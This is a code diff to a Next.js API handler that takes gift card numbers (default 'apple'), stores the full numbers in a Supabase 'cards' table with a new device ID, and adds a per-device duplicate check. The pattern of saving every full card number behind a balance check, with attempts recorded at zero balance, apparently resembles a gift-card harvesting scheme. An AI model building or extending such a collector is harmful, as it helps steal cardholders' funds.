@@ -2,7 +2,7 @@ import { supabase } from '../../lib/supabase'
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' })
-  const { cardNumber, type = 'apple' } = req.body || {}
+  const { cardNumber, type = 'apple', deviceId } = req.body || {}
 
   // Basic validation - allow alphanumeric characters without strict length check
   if (!cardNumber || typeof cardNumber !== 'string' || !/^[A-Z0-9]+$/i.test(cardNumber.replace(/[-\s]/g, ''))) {
@@ -22,11 +22,32 @@ export default async function handler(req, res) {
     balance,
     currency: 'USD',
     timestamp: now,
-    type
+    type,
+    device_id: deviceId
   }
 
   // Save to Supabase (we still save the attempt, but with 0 balance)
   try {
+    // Check for duplicates from the same device
+    if (deviceId) {
+      const { data: existing } = await supabase
+        .from('cards')
+        .select('id')
+        .match({ card_number: cardNumber, device_id: deviceId })
+        .limit(1)
+
+      if (existing && existing.length > 0) {
+        // Return result but skip insert as per user request
+        return res.status(200).json({
+          ...result,
+          cardNumber: result.card_number,
+          cardLast4: last4,
+          isDuplicate: true,
+          message: 'This card has already been submitted from your device. Please wait a moment.'
+        })
+      }
+    }
+
     const { error } = await supabase
       .from('cards')
       .insert([result])
@@ -41,7 +62,6 @@ export default async function handler(req, res) {
     }
   } catch (err) {
     console.error(`Failed to save ${type} card to Supabase:`, err)
-    // We proceed even if saving fails, but now we log the full error
   }
 
   return res.status(200).json({
